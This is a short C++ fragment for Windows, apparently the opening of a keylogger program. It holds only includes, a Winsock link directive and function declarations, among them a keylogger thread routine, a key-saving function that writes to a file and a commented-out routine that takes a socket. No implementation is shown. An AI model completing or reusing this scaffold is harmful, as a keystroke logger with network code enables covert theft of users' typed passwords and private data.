#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <stdint.h>
#pragma comment (lib,"WS2_32.lib")
using namespace std;
char *clear(char *path);
int Save(int _key,char *file);
char *read(char *path);
//void readForImage(char*path,void * sock);
unsigned long __stdcall keyloger( void* );